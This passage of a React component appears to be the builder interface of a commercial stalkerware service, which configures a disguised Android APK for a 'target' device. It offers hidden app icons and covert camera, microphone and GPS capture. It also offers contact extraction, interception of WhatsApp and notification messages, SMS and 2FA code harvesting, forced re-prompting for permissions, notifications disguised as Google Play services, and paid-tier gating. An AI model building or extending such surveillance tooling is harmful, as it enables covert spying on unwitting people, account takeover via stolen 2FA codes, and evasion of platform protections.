                                                    setHideApp(!hideApp);
                                                }}
                                                className={`w-10 h-5 rounded-full transition-colors relative cursor-pointer ${
                                                    hideApp ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'
                                                }`}
                                            >
                                                <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${hideApp ? 'left-5.5' : 'left-0.75'}`} />
                                            </button>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    )}

                    {/* ── STEP 2: Permissions Configuration ── */}
                    {activeStep === 'permissions' && (
                        <div className="space-y-4 animate-in fade-in duration-200">
                            
                            <div className="clay-pill clay-pill-orange px-3 py-1 flex items-center gap-2 w-fit">
                                <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
                                <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
                                    Hardware & Sensor Permissions
                                </span>
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                
                                {/* Storage */}
                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex flex-col min-w-0">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-white">Gallery & Storage</span>
                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-orange-400/60 hover:text-orange-300">
                                                <Info size={13} />
                                            </button>
                                        </div>
                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Index & stream photos & videos</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                        className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableStoragePermission ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'}`}
                                    >
                                        <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableStoragePermission ? 'left-5.5' : 'left-0.75'}`} />
                                    </button>
                                </div>

                                {/* Camera */}
                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex flex-col min-w-0">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-white">Camera Capture</span>
                                            {!isPremium && <Lock size={11} className="text-white/30" />}
                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-orange-400/60 hover:text-orange-300">
                                                <Info size={13} />
                                            </button>
                                        </div>
                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Remote photo & live video</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.('Camera Capture', 'premium'); return; }
                                            setEnableCameraPermission(!enableCameraPermission);
                                        }}
                                        className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableCameraPermission && isPremium ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'}`}
                                    >
                                        <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableCameraPermission && isPremium ? 'left-5.5' : 'left-0.75'}`} />
                                    </button>
                                </div>

                                {/* Microphone */}
                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex flex-col min-w-0">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-white">Live Microphone</span>
                                            {!isPremium && <Lock size={11} className="text-white/30" />}
                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-orange-400/60 hover:text-orange-300">
                                                <Info size={13} />
                                            </button>
                                        </div>
                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Ambient room audio stream</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.('Live Microphone', 'premium'); return; }
                                            setEnableMicrophonePermission(!enableMicrophonePermission);
                                        }}
                                        className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableMicrophonePermission && isPremium ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'}`}
                                    >
                                        <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableMicrophonePermission && isPremium ? 'left-5.5' : 'left-0.75'}`} />
                                    </button>
                                </div>

                                {/* Location */}
                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex flex-col min-w-0">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-white">Live GPS Location</span>
                                            {!isPremium && <Lock size={11} className="text-white/30" />}
                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-orange-400/60 hover:text-orange-300">
                                                <Info size={13} />
                                            </button>
                                        </div>
                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Stealth GPS telemetry radar</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.('Live Location', 'premium'); return; }
                                            setEnableLocationPermission(!enableLocationPermission);
                                        }}
                                        className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableLocationPermission && isPremium ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'}`}
                                    >
                                        <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableLocationPermission && isPremium ? 'left-5.5' : 'left-0.75'}`} />
                                    </button>
                                </div>

                                {/* Contacts */}
                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex flex-col min-w-0">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-white">Contacts Sync</span>
                                            {isBasicPlan && <Lock size={11} className="text-white/30" />}
                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-orange-400/60 hover:text-orange-300">
                                                <Info size={13} />
                                            </button>
                                        </div>
                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Extract address book & numbers</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.('Contacts Sync', 'standard'); return; }
                                            setEnableContactsPermission(!enableContactsPermission);
                                        }}
                                        className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableContactsPermission && !isBasicPlan ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'}`}
                                    >
                                        <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-5.5' : 'left-0.75'}`} />
                                    </button>
                                </div>

                                {/* Notification Reader */}
                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex flex-col min-w-0">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-white">Alerts & WhatsApp</span>
                                            {isBasicPlan && <Lock size={11} className="text-white/30" />}
                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-orange-400/60 hover:text-orange-300">
                                                <Info size={13} />
                                            </button>
                                        </div>
                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Intercept incoming push alerts</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.('Notification Reader', 'standard'); return; }
                                            setEnableNotificationListener(!enableNotificationListener);
                                        }}
                                        className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableNotificationListener && isStandard ? 'bg-orange-500 shadow-[0_0_8px_#f97316]' : 'bg-white/15'}`}
                                    >
                                        <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableNotificationListener && isStandard ? 'left-5.5' : 'left-0.75'}`} />
                                    </button>
                                </div>
                            </div>

                            {/* Advanced Stealth Accordion */}
                            <div className="pt-1">
                                <button
                                    type="button"
                                    onClick={() => setShowAdvancedPermissions(!showAdvancedPermissions)}
                                    className="clay-capsule w-full py-2.5 px-4 rounded-xl flex items-center justify-between text-xs font-mono font-black text-orange-300 transition-all cursor-pointer"
                                >
                                    <div className="flex items-center gap-2">
                                        <Sliders size={14} />
                                        <span>Advanced Stealth & SMS Options</span>
                                    </div>
                                    {showAdvancedPermissions ? <ChevronUp size={14} /> : <ChevronDown size={14} />}
                                </button>

                                {showAdvancedPermissions && (
                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3 animate-in fade-in duration-150">
                                        {/* SMS Access */}
                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                            <div className="flex flex-col min-w-0">
                                                <div className="flex items-center gap-1.5">
                                                    <span className="text-xs font-bold text-rose-300">SMS Messages</span>
                                                    {isBasicPlan && <Lock size={11} className="text-white/30" />}
                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/60 hover:text-rose-300">
                                                        <Info size={13} />
                                                    </button>
                                                </div>
                                                <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Harvest SMS logs & 2FA codes</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
                                                    if (!enableSmsPermission) {
                                                        setShowPlayProtectWarning(true);
                                                    } else {
                                                        setEnableSmsPermission(false);
                                                    }
                                                }}
                                                className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableSmsPermission && !isBasicPlan ? 'bg-rose-500 shadow-[0_0_8px_#f43f5e]' : 'bg-white/15'}`}
                                            >
                                                <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-5.5' : 'left-0.75'}`} />
                                            </button>
                                        </div>

                                        {/* Aggressive Mode */}
                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
                                            <div className="flex flex-col min-w-0">
                                                <div className="flex items-center gap-1.5">
                                                    <span className="text-xs font-bold text-amber-300">Aggressive Prompt</span>
                                                    {isBasicPlan && <Lock size={11} className="text-white/30" />}
                                                </div>
                                                <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Auto-reprompt till granted</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.('Aggressive Mode', 'standard'); return; }
                                                    setAggressivePermissions(!aggressivePermissions);
                                                }}
                                                className={`w-10 h-5 rounded-full transition-colors relative shrink-0 cursor-pointer ${aggressivePermissions && !isBasicPlan ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/15'}`}
                                            >
                                                <div className={`w-3.5 h-3.5 bg-white rounded-full absolute top-0.75 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-5.5' : 'left-0.75'}`} />
                                            </button>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {/* ── STEP 3: Service Style & Notification ── */}
                    {activeStep === 'notifications' && (
                        <div className="space-y-4 animate-in fade-in duration-200">
                            
                            <div className="clay-pill clay-pill-orange px-3 py-1 flex items-center gap-2 w-fit">
                                <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
                                <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
                                    Background Service Camouflage
                                </span>
                            </div>

                            {/* Dropdown 1: Style */}
                            <div className="relative">
                                <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
                                    Notification Cloak Style
                                </label>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setIsStyleMenuOpen(!isStyleMenuOpen);
                                        setIsActionMenuOpen(false);
                                        setIsIconMenuOpen(false);
                                    }}
                                    className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
                                >
                                    <div className="flex items-center gap-3">
                                        <span className="text-xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon || "ℹ️"}</span>
                                        <div>
                                            <div className="text-xs font-bold text-white">
                                                {NOTIFICATION_PRESETS[notificationStyle]?.title || "Google Play services"}
                                            </div>
                                            <div className="text-[10px] text-white/40 font-mono">
                                                {NOTIFICATION_PRESETS[notificationStyle]?.text || "Running background checks"}
                                            </div>
                                        </div>
                                    </div>
                                    <ChevronDown size={16} className={`text-orange-400 transition-transform ${isStyleMenuOpen ? 'rotate-180' : ''}`} />
                                </button>

                                {isStyleMenuOpen && (
                                    <div className="mt-2 bg-[#0c0e12] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-52 overflow-y-auto custom-scrollbar animate-in fade-in z-20 relative">
                                        {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                            <button
                                                key={key}
                                                type="button"
                                                onClick={() => handleSelectStyle(key)}
                                                className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
                                                    notificationStyle === key ? 'bg-orange-500/15 text-orange-300 font-bold' : 'hover:bg-white/5 text-white/70'
                                                }`}
                                            >
                                                <div className="flex items-center gap-2.5">
                                                    <span className="text-lg">{preset.icon}</span>
                                                    <div>
                                                        <div className="text-xs font-bold text-white">{preset.title}</div>
                                                        <div className="text-[10px] text-white/40 font-mono">{preset.text}</div>
                                                    </div>
                                                </div>
                                                {notificationStyle === key && <Check size={14} className="text-orange-400" />}
                                            </button>
                                        ))}
                                    </div>
                                )}
                            </div>

                            {/* Dropdown 2: On-Click Action */}
                            <div className="relative">
                                <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
                                    When Target Taps Notification
                                </label>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setIsActionMenuOpen(!isActionMenuOpen);
                                        setIsStyleMenuOpen(false);
                                        setIsIconMenuOpen(false);
                                    }}
                                    className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="clay-icon-pod w-7 h-7 rounded-lg flex items-center justify-center text-orange-400">
                                            <MousePointerClick size={14} />
                                        </div>
                                        <span className="text-xs font-bold text-white">
                                            {CLICK_ACTIONS[notificationClickAction] || "Open App Info & Permissions"}
                                        </span>
                                    </div>
                                    <ChevronDown size={16} className={`text-white/40 transition-transform ${isActionMenuOpen ? 'rotate-180' : ''}`} />
                                </button>

                                {isActionMenuOpen && (
                                    <div className="mt-2 bg-[#0c0e12] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-52 overflow-y-auto custom-scrollbar animate-in fade-in z-20 relative">
                                        {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
                                            <button
                                                key={key}
                                                type="button"
                                                onClick={() => {
                                                    setNotificationClickAction(key);
                                                    setIsActionMenuOpen(false);
                                                }}
                                                className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
                                                    notificationClickAction === key ? 'bg-orange-500/15 text-orange-300 font-bold' : 'hover:bg-white/5 text-white/70'
                                                }`}
                                            >
                                                <span className="text-xs text-white">{label}</span>
                                                {notificationClickAction === key && <Check size={14} className="text-orange-400" />}
                                            </button>
                                        ))}
                                    </div>
                                )}
                            </div>

                            {/* Dropdown 3: Status Bar Icon */}
                            <div className="relative">
                                <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
                                    Status Bar Tray Icon
                                </label>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setIsIconMenuOpen(!isIconMenuOpen);
                                        setIsStyleMenuOpen(false);
                                        setIsActionMenuOpen(false);
                                    }}
                                    className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
                                >
                                    <div className="flex items-center gap-3">
                                        <span className="text-lg">{ICON_OPTIONS[notificationIcon]?.symbol || "ℹ️"}</span>
                                        <span className="text-xs font-bold text-white">
                                            {ICON_OPTIONS[notificationIcon]?.label || "Info Badge"}
                                        </span>
                                    </div>
                                    <ChevronDown size={16} className={`text-white/40 transition-transform ${isIconMenuOpen ? 'rotate-180' : ''}`} />
                                </button>

                                {isIconMenuOpen && (
                                    <div className="mt-2 bg-[#0c0e12] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in z-20 relative">
                                        {Object.entries(ICON_OPTIONS).map(([key, item]) => (
                                            <button
                                                key={key}
                                                type="button"
                                                onClick={() => {
                                                    setNotificationIcon(key);
                                                    setIsIconMenuOpen(false);
                                                }}
                                                className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
                                                    notificationIcon === key ? 'bg-orange-500/15 text-orange-300 font-bold' : 'hover:bg-white/5 text-white/70'
                                                }`}
                                            >
                                                <div className="flex items-center gap-2.5">
                                                    <span className="text-base">{item.symbol}</span>
                                                    <span className="text-xs text-white">{item.label}</span>
                                                </div>
                                                {notificationIcon === key && <Check size={14} className="text-orange-400" />}
                                            </button>
                                        ))}
                                    </div>
                                )}
                            </div>

                            {/* Live Notification Drawer Preview */}
                            <div className="clay-card p-4 rounded-3xl space-y-2">
                                <div className="flex items-center justify-between text-[10px] font-mono text-white/40">
                                    <span className="flex items-center gap-1.5 text-orange-300 font-bold">
                                        <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
                                        LIVE NOTIFICATION SHADE
                                    </span>
                                    <span>Silent • Minimized</span>
                                </div>

                                <div className="clay-capsule p-3 rounded-2xl flex items-center justify-between gap-3">
                                    <div className="flex items-center gap-3">
                                        <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-lg">
                                            {ICON_OPTIONS[notificationIcon]?.symbol || NOTIFICATION_PRESETS[notificationStyle]?.icon}
                                        </div>
                                        <div>
                                            <div className="text-xs font-black text-white">
                                                {notificationStyle === 'custom' ? (notificationTitle || 'System Service') : NOTIFICATION_PRESETS[notificationStyle]?.title}
                                            </div>
                                            <div className="text-[10px] text-white/40 font-mono mt-0.5">
                                                {notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : NOTIFICATION_PRESETS[notificationStyle]?.text}
                                            </div>
                                        </div>
                                    </div>
                                    <span className="px-2 py-0.5 rounded-lg bg-orange-500/15 border border-orange-500/20 text-[9px] font-mono font-bold text-orange-300">
                                        STEALTH
                                    </span>
                                </div>
                            </div>
                        </div>
                    )}
                </div>

                {/* ── Footer Action HUD ── */}
                <div className="p-4 sm:p-6 border-t border-white/5 bg-black/40 flex flex-col gap-3 flex-shrink-0">
                    
                    {/* Compilation Status HUD */}
                    {status !== 'idle' && (
                        <div className="clay-card p-4 rounded-2xl flex flex-col items-center justify-center text-center space-y-2.5 animate-in fade-in">
                            {status === 'queued' ? (
                                <>
                                    <div className="w-8 h-8 border-3 border-orange-500/30 border-t-orange-500 rounded-full animate-spin" />
                                    <h4 className="text-xs font-bold text-white">Queued in Build Pipeline</h4>
                                    <p className="text-[10px] font-mono text-white/40">Queue Position: <span className="text-orange-300 font-bold">{queuePosition}</span></p>
                                </>
                            ) : status === 'generating' ? (
                                <>
                                    <div className="w-full flex items-center justify-between text-xs font-mono font-bold text-white/70">
                                        <span>{progressStep || "Compiling APK..."}</span>
                                        <span className="text-orange-300">{progress}%</span>
                                    </div>
                                    <div className="w-full h-2 bg-black/60 rounded-full overflow-hidden border border-white/5 p-0.5 shadow-inner">
                                        <div
                                            className="h-full bg-gradient-to-r from-orange-500 to-amber-400 rounded-full transition-all duration-300 shadow-[0_0_8px_#f97316]"
                                            style={{ width: `${progress}%` }}
                                        />
                                    </div>
                                </>
                            ) : status === 'completed' ? (
                                <>
                                    <CheckCircle2 size={30} className="text-emerald-400" />
                                    <h4 className="text-sm font-black text-white">APK Compilation Ready!</h4>
                                    <p className="text-[10px] font-mono text-white/40">Signed with Android V2/V3 schemes.</p>
                                    {downloadUrl && (
                                        <a
                                            href={downloadUrl}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            download={`${activeApp.name.replace(/\s+/g, '_')}.apk`}
                                            className="clay-cta-button px-6 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider flex items-center gap-2 shadow-lg transition-transform hover:scale-105 active:scale-95 cursor-pointer"
                                        >
                                            <Download size={14} /> Download APK
                                        </a>
                                    )}
                                </>
                            ) : null}
                        </div>
                    )}

                    {/* Step Navigation Buttons */}
                    <div className="flex items-center justify-between gap-3">
                        {activeStep !== 'identity' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
                                className="clay-capsule px-4 py-2.5 rounded-xl text-white/60 hover:text-white font-mono font-bold text-xs uppercase tracking-wider transition-all cursor-pointer"
                            >
                                ← Previous
                            </button>
                        ) : <div />}

                        {activeStep !== 'notifications' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
                                className="clay-cta-button px-6 py-2.5 rounded-xl font-black text-xs uppercase tracking-wider flex items-center gap-1.5 transition-all hover:scale-105 active:scale-95 cursor-pointer"
                            >
                                <span>Next Step</span>
                                <ChevronRight size={14} />
                            </button>
                        ) : status === 'idle' ? (
                            <button
                                type="button"
                                onClick={startGeneration}
                                className="clay-cta-button px-8 py-3 rounded-2xl font-black text-xs sm:text-sm uppercase tracking-widest flex items-center gap-2 transition-transform hover:scale-105 active:scale-95 shadow-[0_8px_24px_rgba(249,115,22,0.5)] cursor-pointer"
                            >
                                <Zap size={15} /> Build {selectedPreset === 'custom' ? 'Custom' : activeApp.name} APK
                            </button>
                        ) : (
                            <button
                                type="button"
                                onClick={onClose}
                                className="clay-capsule px-5 py-2.5 rounded-xl text-white/60 hover:text-white font-mono font-bold text-xs uppercase transition-all cursor-pointer"
                            >
                                Close
                            </button>
                        )}
                    </div>
                </div>

                {/* ── Sub-Modals (Info & Warnings) ── */}
                {showAppInfoModal && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/80 backdrop-blur-md p-4" onClick={() => setShowAppInfoModal(null)}>
                        <div className="clay-card rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                            <button
                                onClick={() => setShowAppInfoModal(null)}
                                className="clay-button-sm w-8 h-8 rounded-lg flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
                            >
                                <X size={14} />
                            </button>

                            <div className="flex items-center gap-3">
                                {renderPresetIconBadge(showAppInfoModal)}
                                <div>
                                    <h4 className="text-sm font-black text-white">
                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.name}
                                    </h4>
                                    <span className="text-[10px] font-mono text-orange-300">
                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.packageName}
                                    </span>
                                </div>
                            </div>

                            <div className="clay-coords-badge p-3.5 rounded-2xl">
                                <h5 className="text-xs font-bold text-orange-300 mb-1">
                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoTitle}
                                </h5>
                                <p className="text-xs text-white/70 leading-relaxed font-sans">
                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoText}
                                </p>
                            </div>

                            <button
                                onClick={() => setShowAppInfoModal(null)}
                                className="clay-cta-button w-full py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
                            >
                                Got It
                            </button>
                        </div>
                    </div>
                )}

                {/* Play Protect Warning Modal */}
                {showPlayProtectWarning && (
                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350] p-4" onClick={() => setShowPlayProtectWarning(false)}>
                        <div className="clay-card rounded-3xl p-6 max-w-sm w-full border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-3">
                                <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-red-400">
                                    <AlertTriangle size={20} />
                                </div>
                                <div>
                                    <h3 className="text-sm font-bold text-white">Play Protect Heuristic Note</h3>
                                    <p className="text-[10px] text-red-400 font-mono">SMS Permission Flag</p>
                                </div>
                            </div>

                            <p className="text-white/70 text-xs leading-relaxed font-sans">
                                Enabling <strong>SMS Access</strong> requires the target to approve sensitive text permissions during installation.
                            </p>

                            <div className="flex gap-2">
                                <button
                                    type="button"
                                    onClick={() => setShowPlayProtectWarning(false)}
                                    className="clay-capsule flex-1 py-2.5 rounded-xl text-white/60 hover:text-white text-xs font-bold transition-all cursor-pointer"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setEnableSmsPermission(true);
                                        setShowPlayProtectWarning(false);
                                    }}
                                    className="clay-card-error flex-1 py-2.5 rounded-xl text-red-300 hover:text-white text-xs font-bold transition-all cursor-pointer"
                                >
                                    Enable SMS
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Permission Info Modal */}
                {showPermissionInfo && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/80 backdrop-blur-md p-4" onClick={() => setShowPermissionInfo(null)}>
                        <div className="clay-card rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="clay-button-sm w-8 h-8 rounded-lg flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
                            >
                                <X size={14} />
                            </button>

                            <div className="flex items-center gap-3">
                                <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-orange-400">
                                    <Info size={20} />
                                </div>
                                <div>
                                    <h4 className="text-sm font-black text-white capitalize">{showPermissionInfo} Access</h4>
                                    <span className="text-[10px] font-mono text-orange-300">Background Capability</span>
                                </div>
                            </div>

                            <div className="clay-coords-badge p-3.5 rounded-2xl">
                                <p className="text-xs text-white/75 leading-relaxed font-sans">
                                    {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
                                    {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
                                    {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
                                    {showPermissionInfo === 'contacts' && "Enables synchronization of stored phonebook contacts, SIM directory entries, and configured Google account names."}
                                    {showPermissionInfo === 'notifications' && "Enables real-time interception of WhatsApp, Instagram, Telegram messages, system toasts, and incoming notification previews."}
                                    {showPermissionInfo === 'location' && "Enables continuous stealth GPS coordinates telemetry and geofencing without battery strain."}
                                    {showPermissionInfo === 'sms' && "Enables reading incoming verification OTP codes, incoming/outgoing SMS history logs, and system text alerts."}
                                </p>
                            </div>

                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="clay-cta-button w-full py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
                            >
                                Got It
                            </button>
                        </div>
                    </div>
                )}

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div>
    );
}
